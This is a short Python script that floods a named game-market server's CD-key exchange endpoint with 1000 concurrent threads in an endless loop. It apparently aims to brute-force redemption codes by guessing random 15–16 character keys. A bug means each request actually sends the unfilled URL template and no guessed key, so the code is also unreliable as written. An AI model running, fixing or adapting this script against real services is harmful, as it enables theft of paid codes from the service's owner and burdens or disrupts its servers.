import json
import random
import string
import threading
import requests

url = "http://market.kbostar.com:8928/cdkey/exchange?cdkey={}&channel=10005"


def requestApi():
    key = generate_random_string()
    requestUrl = url.format(key)
    try:
        data  = requests.get(url=url, timeout=5)
        print(data.text)
    except Exception as e:
        e

def threadSend():
    threads = []
    for t in range(1000):
        threads.append(threading.Thread(target=requestApi, args=()))
    for thr in threads:
        thr.start()
    for thr in threads:
        thr.join()


def generate_random_string():
    # 允许的字符集：大写字母和数字
    characters = string.ascii_uppercase + string.digits
    # 随机选择长度是15还是16
    length = random.choice([15, 16])
    # 生成指定长度的随机字符串
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string


if __name__ == '__main__':
    i = 0
    while True:
        threadSend()
        i = i + 1
        print(i)
